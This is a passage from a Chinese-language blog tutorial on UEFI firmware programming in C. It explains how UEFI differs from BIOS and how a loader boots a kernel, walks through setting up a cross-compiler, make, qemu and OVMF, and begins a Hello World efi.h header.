控制器等</li><li>直接引导操作系统，无需引导扇区。</li></ul></li><li><p>除此之外<code>UEFI</code>还有其他<code>BIOS</code>所没有的功能：</p><ul><li><code>UEFI Shell</code>：UEFI还提供了shell环境，我们可以通过shell命令来查看已识别的磁盘和设备</li><li>提供驱动程序接口：这些驱动以<code>.efi</code>文件形式存在，支持热拔插、动态加载等特性</li><li>具有用户界面（GUI）</li><li>能更安全的进行启动</li></ul></li><li><p>接下来我们再进一步理解<code>UEFI</code>这个名称的具体由来，以及它取代<code>BIOS</code>的原因：</p><ul><li>在早期，各个硬件的厂商都有自己的<code>BIOS</code>来管理或者自检自己生产的主板等硬件，这就使得<code>BIOS</code>的类型太多，并且各个<code>BIOS</code>也不兼容。</li><li>这时<code>UEFI</code>就对这些厂商的设计进行了一定的规范，各个厂商在设计主板的时候都遵循这个规范，并且让<code>UEFI</code>取代<code>BIOS</code>，作为自检的固件。并且<code>UEFI</code>还兼容不同的架构，即<code>x86</code>、<code>x86_64</code>、<code>ARM</code>，这就使得底层的设计变得稍微轻松一点。这就是<code>UEFI</code>中<code>U</code>（统一）的由来。</li><li>早期使用<code>BIOS</code>的时候，固件的功能已经固定了，如果我们要添加新的固件，比如新添加一个网卡，这时我们就需要更新整个<code>BIOS</code>，使得<code>BIOS</code>增加新网卡的这一固件，这样上层操作系统才能够与新的固件网卡交互。</li><li>而<code>UEFI</code>的出现就使得我们添加新固件后并不需要再更新<code>UEFI</code>，这时我们如果新添加一个<code>SSD</code>，就无需更新<code>UEFI</code>，它可以将<code>SSD</code>中的<code>.efi</code>程序加载进来，实现灵活扩展的功能。这就是<code>E</code>（可扩展的由来）</li><li>而<code>F</code>也就是<code>Firmware</code>(固件)的由来是<code>UEFI</code>本身就存储在<code>ROM</code>、<code>Flash</code>中，并且是一个软件，所以就被称为固件。</li><li><code>I</code>就是<code>Interface</code>（接口）：也就是<code>UEFI</code>为操作系统提供了统一的可以访问底层硬件的方式。</li></ul></li><li><p>接下来我们再具体介绍一下<code>UEFI</code>，当我们计算机还没有开机的时候，架构是这样的，此时我们主板的<code>FIRMWARE</code>其实也就是<code>UEFI</code>，然后<code>Loader</code>和<code>kernel</code>被放入到磁盘格式为<code>FAT32</code>的文件中</p></li><li><p>但是主板的<code>UEFI 固件</code>只认识<code>efi</code>格式的文件，加载不了<code>exe</code>或者<code>elf</code>文件（下文都使用<code>elf</code>文件），即我们的内核<code>kernel</code>就没办法加载到内存中。</p></li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250322080144179.png" alt="image-20250322080144179"></p><ul><li>这时我们就需要使用<code>Loader</code>，<code>Loader</code>这个程序起到承上启下的作用，它会解析<code>kernel</code>这个<code>elf</code>文件格式，并对其进行加载。而<code>Loader</code>则是一个<code>efi</code>格式并且会保存在特定位置，这时计算机启动的时候主板的<code>UEFI 固件</code>就能识别并运行<code>Loader</code>，然后<code>Loader</code>又可以将<code>Kernal</code>加载进内存当中。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250322080904885.png" alt="image-20250322080904885"></p><ul><li>而<code>Loader</code>所处的特定位置，要求位于启动设备的<code>FAT32</code>格式分区，一个<code>U</code>盘或者其他东西，只要是<code>FAT32</code>的格式，在启动的时候就会被计算机识别，并标明<code>UEFI</code>的字样，说明固件发现了这个磁盘格式。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250322081055653.png" alt="image-20250322081055653"></p><ul><li>当我们启动时，选择了该位置则计算机就会在这里去寻找<code>Loader</code>，计算机会按照<code>/EFI/Boot/BootX64.efi</code>这个路径去寻找<code>Loader</code></li><li>一般这个<code>FAT32</code>分区，都位于磁盘最开始，大小在<code>100M</code>左右</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250322081351126.png" alt="image-20250322081351126"></p><ul><li><p>总结：</p><ul><li><code>UEFI</code>固件会将是<code>FAT32</code>格式分区的磁盘（一个磁盘可能有多个格式分区），都当做启动磁盘，并将这些发现的磁盘都添加到开机菜单中</li><li>接下去我们就可以选择一个启动磁盘，如果是带<code>UEFI</code>前缀，就去搜索固定路径。</li></ul></li><li><p>而在加载<code>kernal</code>中又会出现如下问题：</p><ul><li><code>kernal</code>在<code>FAT32</code>分区应该如何读取？</li><li><code>kernal</code>以何种方式载入内存，应该放入内存的什么位置？</li><li><code>kernal</code>放入的内存是空闲的吗？</li><li><code>kernal</code>应该采取段式内存载入还是进行内存分页呢？</li><li>这些问题如果没有统一的<code>API</code>，就会使得<code>Loader</code>的开发相当复杂，所以<code>UEFI</code>存在的目的不仅仅是加载<code>Loader</code>，还为开发者创造一个统一、便捷的启动环境</li><li>并且对于<code>UEFI</code>其提供的<code>API</code>，不仅仅是提供给<code>Loader</code>，还提供给了<code>运行时的操作系统</code>，例如操作系统是通过<code>UEFI</code>提供的<code>API</code>来获取物理内存的大小。</li></ul></li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250322082707983.png" alt="image-20250322082707983"></p><h2 id="关于开发文档"><a class="markdownIt-Anchor" href="#关于开发文档"></a> 关于开发文档</h2><ul><li><p>我们可以去这个网站下载关于<code>UEFI</code>的一些开发规范：<a href="https://uefi.org/specifications">Specifications | Unified Extensible Firmware Interface Forum</a></p></li><li><p>在访问这个网站的时候我们还会看到一个固件规范：<code>ACPI</code>，这个固件和<code>UEFI</code>一起密切协作，共同负责系统启动、硬件管理和电源控制。不过这里主要是对<code>UEFI</code>的开发。<strong>特别地：休眠状态与ACPI这个固件关系比较大</strong></p></li><li><p>在这个网站中有<code>UEFI规范</code>、<code>UEFI Shell规范</code>、<code>UEFI平台初始化规范</code>，但是我们只使用<code>UEFI规范</code>，其他两个在这边并不需要使用。这边视频教程中使用的是<code>2.10</code>版本的规范，这边我就也使用<code>2.10</code>版本的规范（还比较新，没旧到哪里去）。网址在这里：<a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_10_A_Aug8.pdf">UEFI_Spec_2_10_A_Aug8.pdf (SECURED)</a></p></li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250318230452368.png" alt="image-20250318230452368"></p><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250318230537594.png" alt="image-20250318230537594"></p><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250318230611045.png" alt="image-20250318230611045"></p><h1 id="环境与工具"><a class="markdownIt-Anchor" href="#环境与工具"></a> 环境与工具</h1><ul><li>首先要明确一点：<code>UEFI</code>的制定很大程度上借鉴了<code>Microsoft</code>，它的编写规范似乎遵循了<code>Microsoft</code>的编程习惯，并且UEFI规定需要使用PE可执行文件。所以我们一般是在<code>windows</code>上对<code>UEFI</code>进行开发，或者也可以在<code>Linux</code>下，使用交叉编译工具对<code>UEFI</code>进行编译。</li><li>这个内容将会使用<code>gcc</code>交叉编译，并且使用<code>make</code>来构建编译脚本，然后使用<code>qemu</code>模拟运行它，然后使用<code>OVMF</code>充当固件，之后会使用工具创建一个<code>GPT磁盘镜像</code>（EFI规范的镜像格式），用于存放<code>EFI</code>应用。之后可以使用模拟器运行<code>EFI</code>也可以将镜像装入<code>U</code>盘在真实机中运行UEFI（这一步就不做了）。</li></ul><h2 id="编译器安装"><a class="markdownIt-Anchor" href="#编译器安装"></a> 编译器安装</h2><ul><li><code>gcc</code>或者<code>mingw</code>或者<code>clang</code>，这里<code>gcc</code>需要的是交叉编译的<code>gcc</code>即能编译出<code>PE</code>文件的gcc。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install gcc-mingw-w64-x86-64</span><br></pre></td></tr></table></figure><ul><li>安装好后查看是否安装成功</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc --version</span><br></pre></td></tr></table></figure><h2 id="自动化构建工具"><a class="markdownIt-Anchor" href="#自动化构建工具"></a> 自动化构建工具</h2><ul><li>使用<code>make</code>这一自动化构建工具，通过制作<code>make</code>文件，使得<code>make</code>调用编译器去编译。安装如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install make</span><br></pre></td></tr></table></figure><ul><li>安装好后检查是否安装成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make --version</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319075928359.png" alt="image-20250319075928359"></p><h2 id="虚拟化运行工具"><a class="markdownIt-Anchor" href="#虚拟化运行工具"></a> 虚拟化运行工具</h2><ul><li>安装<code>qemu</code>，使用qemu运行我们所编译好的<code>UEFI</code>，这样我们就可以查看我们所编写的<code>UEFI</code>的具体功能和效果。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-system-x86_64</span><br><span class="line">// 如果这个命令安装不成功就查看其他安装命令</span><br></pre></td></tr></table></figure><ul><li>然后使用命令，查看<code>qemu</code>是否安装成功，可以使用<code>Ctrl+Alt+加号</code>放大终端，也可以使用<code>Ctrl+ALT+减号</code>缩小终端。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319080921754.png" alt="image-20250319080921754"></p><h2 id="uefi模拟文件"><a class="markdownIt-Anchor" href="#uefi模拟文件"></a> UEFI模拟文件</h2><ul><li>安装<code>ovmf</code>，UEFI模拟文件，在虚拟机中<code>ovmf</code>充当<code>UEFI/BIOS</code>的功能，在虚拟机启动的时候完成对应的功能。这个文件存储在<code>/usr/share/ovmf</code>这个目录下。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319082516863.png" alt="image-20250319082516863"></p><ul><li>我们需要额外下载一个<code>OVMF-pure-efi.fd</code>这个文件，从这里下载：<a href="https://www.kraxel.org/repos/jenkins/edk2/">Index of /repos/jenkins/edk2</a></li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319082826695.png" alt="image-20250319082826695"></p><ul><li>下载后解压文件夹就会看到这个<code>.fd</code>文件，然后将这个文件复制到<code>/usr/share/ovmf</code>这个文件夹中。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319082931780.png" alt="image-20250319082931780"></p><ul><li>我们使用<code>qemu</code>先运行一下这个<code>fd</code>文件看看真实效果，这时我们会发现我们进入了<code>UEFI Shell</code>中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -bios /usr/share/ovmf/OVMF-pure-efi.fd -net none </span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319083327576.png" alt="image-20250319083327576"></p><ul><li>之后我们要将这个<code>OVMF-pure-efi.fd</code>移动到这个目录下，并重新命名为<code>bios64.bin</code>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/myheart/program/my_uefi</span><br></pre></td></tr></table></figure><ul><li>之后我们制作好了<code>BOOTX64.EFI </code>，使用qemu启动时，<code>bios64.bin</code>使用的就是<code>OVMF-pure-efi.fd</code></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-drive format=raw,unit=0,file=test.hdd \</span><br><span class="line">-bios ../bios64.bin \</span><br><span class="line">-m 256M \</span><br><span class="line">-vga std \</span><br><span class="line">-name TESTOS \</span><br><span class="line">-machine q35 \</span><br><span class="line">-net none</span><br></pre></td></tr></table></figure><h2 id="uefi_gpt镜像生成器"><a class="markdownIt-Anchor" href="#uefi_gpt镜像生成器"></a> UEFI_GPT镜像生成器</h2><ul><li><code>GPT disk image</code>，磁盘分区格式，通常用于存储<code>UEFI</code>文件。在<code>github</code>上使用这个项目的软件：<a href="https://github.com/queso-fuego/UEFI-GPT-image-creator">queso-fuego/UEFI-GPT-image-creator: GPT Disk Image Creator for UEFI Development, with EFI System Partition and FAT32 Filesystem</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/queso-fuego/UEFI-GPT-image-creator.git</span><br></pre></td></tr></table></figure><ul><li>拉取到本地文件夹后，就可以使用<code>cd</code>命令进入该文件夹，在该文件夹中会看到<code>.sh</code>文件，这是自动编译该<code>镜像生成器</code>的命令，在<code>windos</code>上可以使用<code>.bat</code>文件实现自动编译。编译后就会出现<code>write_gpt</code>这个文件</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319084345386.png" alt="image-20250319084345386"></p><h2 id="u盘不详细说明"><a class="markdownIt-Anchor" href="#u盘不详细说明"></a> U盘（不详细说明）</h2><ul><li><code>U盘</code>（可选）：用于测试真实硬件环境是否可以启动UEFI</li></ul><h1 id="hello_world"><a class="markdownIt-Anchor" href="#hello_world"></a> Hello_world</h1><ul><li>这里简单介绍一下<code>EFI</code>应用的一个例子，初步编写一个在终端上显示<code>Hello_world</code>的<code>UEFI</code>固件。我们只需要两个文件分别为<code>efi.c</code>和<code>efi.h</code></li><li>然后我们要使用<code>make</code>对这两个C语言文件进行交叉编译。</li><li>可以将这些代码敲一遍，也可以直接复制，建议还是敲一遍。</li></ul><h2 id="efih编写"><a class="markdownIt-Anchor" href="#efih编写"></a> efi.h编写</h2><ul><li>我们先来看<code>efi.h</code>的代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> UINT64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> UINTN;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char16_t</span> CHAR16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>     VOID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> UINTN    EFI_STATUS;</span><br><span class="line"><span class="keyword">typedef</span> VOID*    EFI_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPTIONAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST const</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFIAPI __attribute__((ms_abi))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_SUCCESS 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class"><span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        UINT16 ScanCode;</span><br><span class="line">        CHAR16 UnicodeChar;</span><br><span class="line">&#125; EFI_INPUT_KEY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">EFI_STATUS</span></span><br><span class="line"><span class="params">(EFIAPI *EFI_INPUT_READ_KEY)</span> <span class="params">(</span></span><br><span class="line"><span class="params"> IN EFI_SIMPLE_TEXT_INPUT_PROTOCOL *This,</span></span><br><span class="line"><span class="params"> OUT EFI_INPUT_KEY                 *Key</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span> &#123;</span></span><br><span class="line">        <span class="type">void</span>* Reset;</span><br><span class="line">        EFI_INPUT_READ_KEY ReadKeyStroke;</span><br><span class="line">        <span class="type">void</span>* WaitForKey;</span><br><span class="line">&#125; EFI_SIMPLE_TEXT_INPUT_PROTOCOL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BLACK  0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BLUE   0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_GREEN  0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_CYAN   0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_RED    0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_YELLOW 0x0E</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_WHITE  0x0F</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_TEXT_ATTR(Foreground,Background) \</span></span><br><span class="line"><span class="meta">        ((Foreground) | ((Background) &lt;&lt; 4))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">EFI_STATUS</span></span><br><span class="line"><span class="params">(EFIAPI *EFI_TEXT_STRING)</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *This,</span></span><br><span class="line"><span class="params">  IN CHAR16                          *String</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">EFI_STATUS</span></span><br><span class="line"><span class="params">(EFIAPI *EFI_TEXT_SET_ATTRIBUTE)</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *This,</span></span><br><span class="line"><span class="params">  IN UINTN                           Attribute</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">EFI_STATUS</span></span><br><span class="line"><span class="params">(EFIAPI *EFI_TEXT_CLEAR_SCREEN)</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *This</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span> &#123;</span></span><br><span class="line">        <span class="type">void</span> *                      Reset;</span><br><span class="line">        EFI_TEXT_STRING             OutputString;</span><br><span class="line">        <span class="type">void</span> *                      TestStringl;</span><br><span class="line">        <span class="type">void</span> *                      QueryMode;</span><br><span class="line">        <span class="type">void</span> *                      SetMode;</span><br><span class="line">        EFI_TEXT_SET_ATTRIBUTE      SetAttribute;</span><br><span class="line">        EFI_TEXT_CLEAR_SCREEN       ClearScreen;</span><br><span class="line">        <span class="type">void</span> *                      SetCursorPosition;</span><br><span class="line">        <span class="type">void</span> *                      EnableCursor;</span><br><span class="line">        <span class="type">void</span> *                      Mode;</span><br><span class="line">&#125; EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        EfiResetColde,</span><br><span class="line">        EfiResetWarm,</span><br><span class="line">        EfiResetShutdown,</span><br><span class="line">        EfiResetPlatformSpecific</span><br><span class="line">&#125; EFI_RESET_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">VOID</span></span><br><span class="line"><span class="params">(EFIAPI *EFI_RESET_SYSTEM)</span> <span class="params">(</span></span><br><span class="line"><span class="params">        IN EFI_RESET_TYPE ResetType,</span></span><br><span class="line"><span class="params">        IN EFI_STATUS     ResetStatus,</span></span><br><span class="line"><span class="params">        IN UINTN          DataSize,</span></span><br><span class="line"><span class="params">        IN VOID           *ResetData OPTIONAL</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        UINT64 Signature;</span><br><span class="line">        UINT32 Revision;</span><br><span class="line">        UINT32 HeaderSize;</span><br><span class="line">        UINT32 CRC32;</span><br><span class="line">        UINT32 Reserved;</span><br><span class="line">&#125; EFI_TABLE_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        EFI_TABLE_HEADER Hdr;</span><br><span class="line">        <span class="type">void</span>*                           GetTime;</span><br><span class="line">        <span class="type">void</span>*                           SetTime;</span><br><span class="line">        <span class="type">void</span>*                           GetWakeupTime;</span><br><span class="line">        <span class="type">void</span>*                           SetWakeupTime;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           